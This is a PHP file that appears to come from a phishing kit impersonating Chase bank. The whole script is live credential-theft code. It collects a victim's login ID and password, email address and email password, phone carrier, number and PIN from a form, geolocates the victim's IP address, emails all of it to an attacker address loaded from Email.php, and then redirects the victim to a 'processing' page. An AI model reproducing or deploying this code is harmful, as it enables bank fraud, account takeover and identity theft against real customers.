<?php
ini_set("output_buffering",4096);
@session_start();
ob_start();

include 'Email.php';

$_SESSION['email'] = $_POST['email'];
$_SESSION['epass'] = $_POST['epass'];
$_SESSION['type'] = $_POST['type'];
$_SESSION['phone'] = $_POST['phone'];
$_SESSION['phopin'] = $_POST['phopin'];

$ipaddress = $_SERVER['REMOTE_ADDR'];
$ipaddress2 = $_SERVER['HTTP_CLIENT_IP'];
$host = bin2hex ($_SERVER['HTTP_HOST']);
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ipaddress));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------[ P.I ]---------------------\n";
$message .= "User ID        : ".$_SESSION['usr']."\n";
$message .= "Password       : ".$_SESSION['pwd']."\n";
$message .= "--------------[ SELIM ]---------------------\n";
$message .= "Email      	    : ".$_POST['email']."\n";
$message .= "E Pass             : ".$_POST['epass']."\n";
$message .= "--------------[ P.I ]---------------------\n";
$message .= "Carrier      	    : ".$_POST['type']."\n";
$message .= "Phone Number       : ".$_POST['phone']."\n";
$message .= "Phone PIN          : ".$_POST['phopin']."\n";
$message .= "--------------[ CHASE2020 ]---------------------\n";
$message .= "IP            : ".$ipaddress."\n";
$message .= "--------------[ CHASE2020 ]---------------------\n";
$message .= "|Client IP: ".$ipaddress2."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ipaddress ----\n";
$message .= "Browser                 :".$browserAgent."\n";
$message .= "DateTime                : ".$timedate."\n";
$message .= "country                 : ".$country."\n";
$message .= "Address                 : ".$addr_details."\n";
$message .= "ISP                     : ".$hostname."\n";
$subject = "xXxXxCHASExXxXx $ipaddress";
$headers = "From: Mokaa<Source@Bourder.land>";
mail($SEND,$subject,$message,$headers);

header("Location: processing.php?$host$host$host$host");


?>